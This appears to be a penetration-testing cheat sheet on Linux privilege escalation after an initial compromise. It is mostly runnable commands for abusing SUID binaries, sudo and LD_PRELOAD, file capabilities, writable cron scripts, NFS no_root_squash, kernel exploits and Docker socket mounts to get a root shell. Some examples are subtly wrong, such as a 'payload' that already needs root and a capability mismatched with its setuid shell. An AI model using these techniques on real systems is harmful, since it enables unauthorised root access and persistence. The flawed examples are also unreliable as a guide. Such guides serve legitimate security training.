
# 🧠 Linux Privilege Escalation Handbook

## Table of Contents  
1. [Introduction](#introduction)  
2. [Post-Compromise Enumeration](#post-compromise-enumeration)  
3. [SUID / GUID Binaries](#SUID / GUID Binaries)  
4. [Sudo Misconfigurations](#sudo-misconfigurations)  
5. [Capabilities & File Capabilities](#capabilities-file-capabilities)  
6. [Cron Jobs & Scheduled Tasks](#cron-jobs-and-scheduled-tasks)  
7. [Misconfigured NFS Shares](#misconfigured-nfs-shares)  
8. [Kernel Exploits & Privilege Escalation](#kernel-exploits-and-privilege-escalation)  
9. [Containers, Docker, LXC Escalation](#containers-docker-lxc-escalation)  
10. [Network & Pivoting Vectors](#network-and-pivoting-vectors)  
11. [Summary & Checklist](#summary-and-checklist)  

---

## Introduction  
Once you gain access to a Linux machine—whether as a limited user or as root—**privilege escalation** becomes your next major objective (if you’re not root) or your next step for deeper compromise and persistence.  
This handbook compiles all major vectors and techniques to escalate privileges on Linux.

---

## Post-Compromise Enumeration  
Before exploiting anything, **enumeration** is essential to understand the system, user context, services, potential paths.  
### Key Commands  
```bash
hostname  
uname -a  
cat /proc/version  
cat /etc/issue  

ps aux  
ps axjf  
env  
sudo -l  
ls -la /home  
id  
ifconfig || ip a  
netstat -lntp  
find / -perm -u=s -type f 2>/dev/null  
````

### What to look for

* OS, kernel, architecture
* Users + groups
* SUID binaries
* Writable files & weak permissions
* Sudo permissions
* Scheduled tasks / cron jobs
* Misconfigured services (NFS, Docker)
* Network listening services and pivot opportunity

---

## SUID / GUID Binaries

### What are they?

* SUID = Set User ID → program runs with the owner’s privileges
* GUID = Set Group ID → program runs with the group’s privileges

### Why they matter

If owned by root, they allow root-level operations when misused.

### Enumeration

```bash
find / -type f -perm -4000 -ls 2>/dev/null  
```

### Exploitation

* Use editors/interpreters (vim, less)
* Use binaries with shell escape features
* Leverage writable path, PATH hijack, or library injection

### Example payload

```bash
chmod +s /usr/bin/vim  
vim /etc/shadow  
```

---

## Sudo Misconfigurations

### Understanding sudo

`sudo` allows users to run commands as root or another user.
View allowed commands:

```bash
sudo -l
```

### Key misconfigurations

* NOPASSWD: runs without password
* `env_keep+=LD_PRELOAD` or `env_keep+=PATH`
* Unrestricted binaries like: `sudo /bin/bash`, `sudo find`, `sudo python`

### Exploitation

#### GTFOBins

Visit: [https://gtfobins.github.io/#sudo](https://gtfobins.github.io/#sudo)

#### LD_PRELOAD technique

1. Create `shell.c` with `_init()` injecting root shell
2. Compile shared object

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3. Run as sudo:

```bash
sudo LD_PRELOAD=/home/user/shell.so find
```

---

## Capabilities & File Capabilities

### What are they?

Linux capabilities allow granting certain root-equivalent powers without full root.
Example:

```bash
getcap -r / 2>/dev/null
```

A binary showing `cap_dac_read_search+ep` may read files as root.

### Exploitation

Use a binary with elevated capabilities to spawn a shell or read sensitive files:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Cron Jobs & Scheduled Tasks

### Why they matter

Writable scripts or misconfigured cron jobs running as root are golden.

### Enumeration

```bash
cat /etc/crontab  
ls -la /etc/cron.*  
crontab -l -u root
```

### Exploitation

* Replace a script run as root with your own shell
* Hijack PATH if script doesn’t use absolute paths
  Example:

```bash
echo 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh' > /home/user/backup.sh  
chmod +x /home/user/backup.sh  
```

Wait cron, then `/tmp/sh -p`.

---

## Misconfigured NFS Shares

### What is this?

NFS export with `no_root_squash` allows remote root access.

### Vulnerable entry example:

```text
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

### Exploitation steps

1. From attacker:

   ```bash
   showmount -e <TARGET-IP>
   mkdir /mnt/nfs
   sudo mount -t nfs <TARGET-IP>:/tmp /mnt/nfs
   ```
2. Create SUID-root binary inside `/mnt/nfs`
3. On target:

   ```bash
   cd /tmp
   ./nfs
   ```

Root shell.

---

## Kernel Exploits & Privilege Escalation

### Why important

Old or unpatched kernels may have known vulnerabilities (DirtyCow, OverlayFS, DirtyPipe)

### Enumeration

```bash
uname -a  
cat /proc/version
```

### Exploitation

Search for kernel version on Exploit-DB, compile and run exploit, e.g.:

```bash
gcc 12345.c -o exp && ./exp
```

---

## Containers, Docker, LXC Escalation

### Why useful

Misconfigured containers can allow root on host.

### Enumeration

```bash
docker ps  
docker info  
```

### Exploitation

* Host volume mount (`-v /:/host`)
* Privileged container (`--privileged`)
* Unsafe Docker socket `/var/run/docker.sock`
  Example:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Network & Pivoting Vectors

### What to enumerate

* Ports listening on host
* Services communicating externally
* Reverse shell channels

### Useful commands

```bash
netstat -lntp  
ss -lntu  
iptables -L  
route -n
```

### Why escalate network wise

* Lateral movement
* Access to other systems
* Data exfiltration

---

## Summary & Checklist

### Key questions after gaining a shell:

* ✅ What user am I?
* ✅ What sudo rights do I have?
* ✅ Are there SUID binaries?
* ✅ Are there capabilities?
* ✅ Are there writable cron jobs/scripts?
* ✅ Is NFS misconfigured?
* ✅ What kernel version – known exploits?
* ✅ Are there container misconfigs?
* ✅ What network opportunities exist?

Keep this checklist in mind whenever you land a shell.

---

## 🧾 References & Further Reading

* GTFOBins: [https://gtfobins.github.io/](https://gtfobins.github.io/)
* Privilege escalation cheat sheets: (see GitHub repos)
* Exploit-DB: [https://www.exploit-db.com/](https://www.exploit-db.com/)
* Docker & container breakout guides

---

**End of Handbook**

